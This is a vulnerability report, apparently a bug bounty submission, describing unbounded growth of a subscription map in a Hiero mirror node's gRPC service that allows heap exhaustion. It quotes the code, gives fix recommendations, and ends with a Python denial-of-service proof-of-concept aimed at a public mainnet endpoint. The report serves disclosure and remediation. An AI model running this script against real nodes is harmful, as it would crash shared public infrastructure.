### Title
Unbounded `topicMessages` ConcurrentHashMap Growth via Unauthenticated Multi-Topic gRPC Subscriptions Leading to Heap Exhaustion

### Summary
`RedisTopicListener.getSharedListener()` inserts one entry per distinct topic ID into an unbounded `ConcurrentHashMap` with no eviction policy and no cap on the number of entries. Because the gRPC endpoint requires no authentication, imposes no per-IP connection limit, and only limits concurrent calls to 5 per TCP connection (not per client), an unprivileged attacker can open arbitrarily many TCP connections, subscribe to a distinct valid topic ID on each stream, and hold those subscriptions open indefinitely. Entries are only removed when all subscribers to a topic disconnect, so the map—and the associated Redis channel subscriptions and per-subscriber backpressure buffers—grow without bound until the JVM runs out of heap memory.

### Finding Description

**Exact code path:**

`grpc/src/main/java/org/hiero/mirror/grpc/listener/RedisTopicListener.java`, lines 59–62:
```java
protected Flux<TopicMessage> getSharedListener(TopicMessageFilter filter) {
    Topic topic = getTopic(filter);
    return topicMessages.computeIfAbsent(topic.getTopic(), key -> subscribe(topic));
}
```
`topicMessages` is declared at line 33 as a plain `new ConcurrentHashMap<>()` with no size bound.

The cleanup path (`unsubscribe`, lines 82–85) removes an entry only when the `share()` operator cancels its upstream, which happens only when the **last** subscriber to that topic disconnects:
```java
.doOnCancel(() -> unsubscribe(topic))
.doOnComplete(() -> unsubscribe(topic))
...
.retryWhen(...)
.share();
```
An attacker who keeps connections open prevents this path from ever firing.

**Per-subscriber memory amplification** is added by `SharedTopicListener.listen()` (line 24):
```java
.onBackpressureBuffer(listenerProperties.getMaxBufferSize(), BufferOverflowStrategy.ERROR)
```
`maxBufferSize` defaults to 16 384 (`ListenerProperties.java`, line 23). Each subscriber gets its own buffer slot.

**Root cause:** The design assumes the number of distinct live topic subscriptions is small and self-limiting. There is no maximum-size enforcement on `topicMessages`, no per-IP or per-client connection quota, and no authentication gate on the gRPC endpoint.

**Why `checkTopicExists = true` (default, `GrpcProperties.java` line 19) does not prevent the attack:**
The existence check in `TopicMessageServiceImpl.topicExists()` (lines 94–106) queries the entity repository (cached up to `entityCacheSize = 50 000`). On any live network (mainnet, testnet) there are millions of publicly enumerable valid topic IDs retrievable from the unauthenticated REST API. The attacker simply pre-fetches a list of valid IDs and uses each one once.

**Why `maxConcurrentCallsPerConnection = 5` (`NettyProperties.java` line 14) does not prevent the attack:**
This limits calls *per TCP connection*, not per client IP. There is no `maxConnections` setting in `NettyProperties` or `GrpcConfiguration`. An attacker opens *N* TCP connections and gets *5N* concurrent subscriptions, each to a distinct topic ID, creating *5N* map entries.

### Impact Explanation
Each live map entry holds: a `Flux<TopicMessage>` object graph, an active Redis pub/sub channel subscription (consuming memory in both the JVM and the Redis server), and a 16 384-slot backpressure buffer per subscriber. At scale (e.g., 10 000 entries), heap pressure causes frequent GC pauses and ultimately an `OutOfMemoryError`, crashing the gRPC mirror node process. This satisfies the stated scope: shutdown of ≥30 % of network processing nodes without brute-force, because a single attacker script can exhaust one node's heap and the same script can be replayed against additional nodes.

### Likelihood Explanation
The attack requires only a network connection to port 5600 and a list of valid topic IDs (freely available from the public REST API). No credentials, no special protocol knowledge, and no cryptographic material are needed. The attack is fully scriptable, repeatable, and can be sustained indefinitely by keeping TCP connections open. The per-connection call limit of 5 means the attacker needs roughly `heap_size / (memory_per_entry * 5)` TCP connections, which is achievable from a single host or a small botnet.

### Recommendation
1. **Cap `topicMessages` size.** Replace the unbounded `ConcurrentHashMap` with a size-limited structure (e.g., Caffeine `Cache` with `maximumSize`) so that the oldest/least-recently-used entries are evicted when the limit is reached.
2. **Limit total connections per IP** at the Netty/load-balancer layer (add a `maxConnections` property to `NettyProperties` and wire it into the Netty server builder).
3. **Add a global subscriber cap.** Reject new subscriptions when `subscriberCount` (already tracked in `TopicMessageServiceImpl`) exceeds a configurable threshold.
4. **Enforce topic-subscription rate limiting** per source IP using a token-bucket interceptor on the gRPC server.

### Proof of Concept

**Preconditions:**
- Mirror node running with `hiero.mirror.grpc.listener.type=REDIS` (default).
- A list of N valid topic IDs obtained from `GET /api/v1/topics` on the public REST API.

**Steps:**
```python
import grpc, threading
# proto stubs for ConsensusService
from com.hedera.mirror.api.proto import consensus_service_pb2_grpc as cs
from com.hedera.mirror.api.proto import consensus_service_pb2 as cs_pb2
from hashgraph.proto.api import basic_types_pb2

MIRROR_HOST = "mainnet-public.mirrornode.hedera.com:443"
topic_ids = [...]  # list of valid topic IDs from REST API

def subscribe(topic_id):
    channel = grpc.secure_channel(MIRROR_HOST, grpc.ssl_channel_credentials())
    stub = cs.ConsensusServiceStub(channel)
    req = cs_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(topicNum=topic_id))
    for _ in stub.subscribeTopic(req):  # blocks, keeping connection open
        pass

threads = [threading.Thread(target=subscribe, args=(tid,)) for tid in topic_ids]
for t in threads:
    t.start()
# Each thread holds one gRPC stream open to a distinct topic ID.
# topicMessages map grows by 1 per thread; heap grows until OOM.
```

**Expected result:** JVM heap on the mirror node grows proportionally to the number of distinct topic IDs subscribed. With sufficient threads (tunable based on available heap), the node throws `OutOfMemoryError` and crashes.
